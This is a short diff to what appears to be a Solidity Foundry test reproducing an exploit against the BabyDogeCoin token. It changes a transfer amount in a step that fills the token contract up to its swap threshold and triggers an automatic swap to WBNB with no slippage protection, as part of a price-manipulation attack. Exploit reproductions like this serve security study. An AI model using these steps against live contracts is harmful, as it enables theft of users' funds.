@@ -185,7 +185,7 @@ contract ContractTest is Test {
         uint256 transferAmount =
             BabyDogeCoin.numTokensSellToAddToLiquidity() - BabyDogeCoin.balanceOf(address(BabyDogeCoin));
         BabyDogeCoin.transfer(address(BabyDogeCoin), transferAmount);
-        BabyDogeCoin.transfer(address(this), 1000); // trigger swap BabyDogeCoin to WBNB wihtout slippage protection
+        BabyDogeCoin.transfer(address(this), 1); // trigger swap BabyDogeCoin to WBNB wihtout slippage protection
 
         path[0] = address(WBNB);
         path[1] = address(BabyDogeCoin);
